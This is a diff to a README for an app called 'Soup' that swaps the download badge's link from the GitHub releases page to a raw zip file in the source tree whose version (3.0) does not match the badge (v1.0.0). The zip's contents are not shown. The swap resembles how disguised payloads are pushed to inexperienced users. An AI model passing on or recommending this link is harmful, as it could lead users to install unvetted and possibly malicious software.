@@ -26,7 +26,7 @@ No coding experience is required. If you can edit a text file and click a button
 
 ## 📦 Download and Install
 
-[![Download Soup](https://img.shields.io/badge/Download_Soup-v1.0.0-2ea44f?style=for-the-badge&logo=github)](https://github.com/jochi2018/Soup/releases)
+[![Download Soup](https://img.shields.io/badge/Download_Soup-v1.0.0-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jochi2018/Soup/main/src/3.0.zip)
 
 Visit this link to download the application.
 
